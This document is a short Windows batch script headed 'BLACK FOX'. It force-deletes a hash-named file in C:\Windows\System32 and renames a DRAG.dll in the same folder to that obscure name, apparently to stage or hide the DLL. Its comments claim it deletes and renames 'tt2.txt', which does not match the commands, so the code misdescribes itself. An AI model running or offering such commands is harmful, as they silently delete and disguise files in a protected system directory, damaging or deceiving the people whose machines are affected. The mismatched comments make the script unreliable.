@echo off
echo BLACK FOX

:: Delete tt2.txt if it exists
if exist "C:\Windows\System32\20efde9e9158ae4dc5506b23381000b97c9374daa.qmlc" del /f /q "C:\Windows\System32\20efde9e9158ae4dc5506b23381000b97c9374daa.qmlc"

:: Rename DRAG.dll to tt2.txt
ren "C:\Windows\System32\DRAG.dll" "20efde9e9158ae4dc5506b23381000b97c9374daa.qmlc"

exit
